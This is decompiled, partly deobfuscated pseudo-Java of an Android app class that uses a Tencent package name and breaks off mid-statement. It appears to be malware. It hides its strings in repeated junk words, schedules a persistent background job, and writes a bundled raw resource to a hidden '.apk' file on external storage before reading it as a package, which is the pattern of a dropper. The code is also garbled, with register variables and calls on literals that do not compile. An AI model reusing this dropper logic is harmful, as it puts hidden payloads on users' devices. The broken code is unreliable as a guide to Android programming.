package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: MainLauncherActivity
 * Original: Lcom/tencent/tunesxconcerningn109;
 */
public class MainLauncherActivity extends Activity {

    // === FIELDS ===
    public static Boolean Holdit;
    public static boolean IamDone = false;
    public static String T5;
    public static String T_tunesxconcerningn109_2;
    public static String T_tunesxconcerningn109_3;
    public static String T_tunesxconcerningn109_4;
    public static String T_tunesxconcerningn109_6;
    public static String T_tunesxconcerningn109_7;
    public static String T_tunesxconcerningn109_P = "null";
     int PERMISSION_ALL;
     String[] StoragPermissions;

    // === METHODS ===

    static void StaticInitializer() {
        v0 = 0;
        v1 = Boolean.valueOf(0);
        MainLauncherActivity.Holdit = v1;
        v1 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.T_tunesxconcerningn109_2 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.T_tunesxconcerningn109_3 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.T_tunesxconcerningn109_4 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.T5 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.T_tunesxconcerningn109_6 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.T_tunesxconcerningn109_7 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        MainLauncherActivity.IamDone = 0;
        return;
    }

    public void Constructor() {
        // new Activity()
        v0 = 555;
        v2.PERMISSION_ALL = 555;
        v1 = "android.permission.READ_EXTERNAL_STORAGE";
        v2.StoragPermissions = "android.permission.WRITE_EXTERNAL_STORAGE";
        return;
    }

    public static boolean IP_tunesxconcerningn109_I(String param0, PackageManager param1) {
        v0 = 0;
        v2.getPackageInfo(v1, 0);
        v1 = 1;
        return 1;
        return 0;
    }

    public static transient boolean hasPermissions(Context param0, String[] param1) {
        if (v4 == null || v4 == 0) { // goto +21
        if (v5 == null || v5 == 0) { // goto +19
        v0 = v5.length;
        v1 = 0;
        v2 = 0;
        if (v2 >= v0) { // goto +14
        v3 = v5[v2];
        v2 = ActivityCompat.checkSelfPermission(v4, v3);
        if (v3 == null || v3 == 0) { // goto +3
        return 0;
        v2 = v2 + 1;
        // goto (branch)
        v4 = 1;
        return 1;
    }

    public static void schedule_tunesxconcerningn109_Job(Context param0) {
        v0 = "jobscheduler";
        v1 = v4.getSystemService("jobscheduler");
        v1 = new ComponentName();
        v2 = PersistentJobService.class;
        // new ComponentName(v4, v2)
        v4 = Build$VERSION.SDK_INT;
        v2 = 24;
        v3 = 100;
        if (v4 < 24) { // goto +19
        v4 = new JobInfo$Builder();
        // new JobInfo$Builder(100, v1)
        v1 = 900000;
        v4.setPeriodic(900000, 24);
        v4 = v4.build();
        // goto (branch)
        v4 = new JobInfo$Builder();
        // new JobInfo$Builder(100, 900000)
        v1 = 15000;
        v4.setPeriodic(15000, 24);
        v4.build();
        "jobscheduler".schedule(v4);
        return;
    }

    public void Check_tunesxconcerningn109_Bind() {
        v1 = v16;
        v0 = DataPackagingEngine.p_tunesxconcerningn103_r;
        v2 = 2;
        v3 = v0.charAt(2);
        v3 = DataPackagingEngine.c1;
        v4 = 0;
        v5 = "null";
        v6 = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
        v7 = 1;
        v8 = 0;
        if (v0 != v3) { // goto +426
        v0 = MainLauncherActivity.T_tunesxconcerningn109_P;
        v0.toLowerCase();
        v0 = v0.equals("null");
        if (v0 != null && v0 != 0) { // goto +414
        v0 = MainLauncherActivity.T_tunesxconcerningn109_P;
        MainLauncherActivity.getPackageManager(...);
        MainLauncherActivity.IP_tunesxconcerningn109_I(v0, v3);
        if (v0 != null && v0 != 0) { // goto +402
        v0 = Boolean.valueOf(1);
        MainLauncherActivity.Holdit = v0;
        MainLauncherActivity.getApplicationContext(...);
        v0.getPackageName();
        DataPackagingEngine.g_tunesxconcerningn103_t(v0, v3);
        "null".length();
        if ("null" != null && "null" != 0) { // goto +479
        v10 = MainLauncherActivity.getApplicationContext(...);
        v10 = v9.getResources();
        v10 = 2131230720; // 0x7f080000
        v9.openRawResource(v10);
        v10 = v9.available();
        if (v10 == null || v10 == 0) { // goto +457
        v10 = (long) v10;
        v14 = Boolean.valueOf(1);
        v14 = v12.booleanValue();
        v14 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        if (v13 == null || v13 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_2 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v13 = MainLauncherActivity.T_tunesxconcerningn109_3;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v13);
        if (v13 == null || v13 == 0) { // goto +-16
        Boolean.valueOf(0);
        // goto (branch)
        Boolean.valueOf(1);
        v13 = v12.booleanValue();
        if (v13 == null || v13 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_3 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v13 = MainLauncherActivity.T_tunesxconcerningn109_2;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v13);
        if (v13 == null || v13 == 0) { // goto +-14
        v12 = Boolean.valueOf(0);
        // goto (branch)
        v12 = 1024000;
        if (1024000 < 0) { // goto +6
        v10 = 102400;
        // goto (branch)
        v12 = 512000;
        if (512000 < 0) { // goto +56
        Boolean.valueOf(1);
        v11 = 102400.booleanValue();
        if (v11 == null || v11 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_6 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v11 = MainLauncherActivity.T_tunesxconcerningn109_3;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v11);
        if (v11 == null || v11 == 0) { // goto +-14
        Boolean.valueOf(0);
        // goto (branch)
        Boolean.valueOf(1);
        v11 = 102400.booleanValue();
        if (v11 == null || v11 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_7 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v11 = MainLauncherActivity.T_tunesxconcerningn109_3;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v11);
        if (v11 == null || v11 == 0) { // goto +-14
        v10 = Boolean.valueOf(0);
        // goto (branch)
        v10 = 51200;
        // goto (branch)
        v12 = 204800;
        if (204800 < 0) { // goto +5
        v10 = 20480;
        // goto (branch)
        v12 = 1024;
        v15 = 20480.compareTo(1024);
        if (v15 < 0) { // goto +28
        Boolean.valueOf(1);
        v11 = 20480.booleanValue();
        if (v11 == null || v11 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_4 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v11 = MainLauncherActivity.T_tunesxconcerningn109_3;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v11);
        if (v11 == null || v11 == 0) { // goto +-14
        Boolean.valueOf(0);
        // goto (branch)
        v11 = Long.valueOf(20480, v11);
        v11 = 20480.intValue();
        v11 = new StringBuilder();
        // new StringBuilder()
        Environment.getExternalStorageDirectory();
        v13 = 1024.getAbsolutePath();
        v11.append(1024);
        v11.append("/.");
        v13 = "_tunesxconcerningn109_";
        DataPackagingEngine.deljapproximatelyy39("ba_tunesxconcerningn109_se", "_tunesxconcerningn109_");
        v11.append("ba_tunesxconcerningn109_se");
        v11.append(".");
        v11.append("apk");
        v11.toString();
        // new File(v11)
        // new FileOutputStream("_tunesxconcerningn109_")
        v2 = v9.read("_tunesxconcerningn109_", 0, 20480);
        v2 = -1;
        if (v15 == -1) { // goto +7
        ".".write("_tunesxconcerningn109_", 0, v15);
        v2 = 2;
        // goto (branch)
        v9.close();
        ".".close();
        v0.getPackageManager();
        2.getPackageArchiveInfo(v11, 0);
        DataPackagingEngine.dit(v0, 2, v3);
        // goto (branch)
        Boolean.valueOf(1);
        v9 = 2.booleanValue();
        if (v9 == null || v9 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_6 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v9 = MainLauncherActivity.T_tunesxconcerningn109_3;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v9);
        if (v9 == null || v9 == 0) { // goto +-14
        Boolean.valueOf(0);
        // goto (branch)
        Boolean.valueOf(1);
        v9 = 2.booleanValue();
        if (v9 == null || v9 == 0) { // goto +17
        MainLauncherActivity.T_tunesxconcerningn109_7 = "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41";
        v9 = MainLauncherActivity.T_tunesxconcerningn109_3;
        "hypothesisqmacedoniaxjacksonvilleoitalicnflowslwritegindicatorjgovtjrentalsfeditorsosimpsonsyangelsocheckedtpersonalizedzlimitjprecioushratedwcamcorderktarhcostsofilleddoffensiveoognpharmaceuticalvgeneratorsetemplatedrequestlquotesmwallpapersgbeverlyodozensccorpsbdoordstudiosdpalestinevtermacustomscnewtontairzfebruaryrsupportsrefurbishedxsunsetrtransfersjhiringcvastdmoneyeplazalbedqplayingdtestedcspanishkgovernormbbwrfundsromanticideerhbarrelzoftenlreducedkhandleszterroristdlopezblastinglplaybidealqholdsalickingtfixturesistatesaemiratestgiantxminaauskcomplygfunctionalzdyingjtextilejinsuredtgaragemequallyzregardjrevenuejindividualscognitivegrehabjbytehnetworkingkraisedyreferralsflilbrubyzdelivereddrayychargesnassociationminstructorqrepresentativesroutersbinterstatemorganiciquartersyspringsbworkersbcommerciallattractmselleroedwardshfiniteylinuxfandalemapartflandsoexpoztuefbusinesseszcontinuouslyo41".equals(v9);
        if (v9 == null || v9 == 0) { // goto +-14
        v0 = Boolean.valueOf(0);
        // goto (branch)
        DataPackagingEngine.dit(v0, v3, v3);
        v0 = new MainLauncherActivity$FI_tunesxconcerningn109_N();
        // new MainLauncherActivity$FI_tunesxconcerningn109_N(v1, 0)
        v2 = MainLauncherActivity.getApplicationContext(...);
        MainLauncherActivity$FI_tunesxconcerningn109_N.access$102(v0, 2);
        v2 = 2;
        2[0] = "organizationsqumtstartupqrapiistanbuljinnovationypermalinkwpopnveteransbboobhrushgcoordinatedncelebratec147";
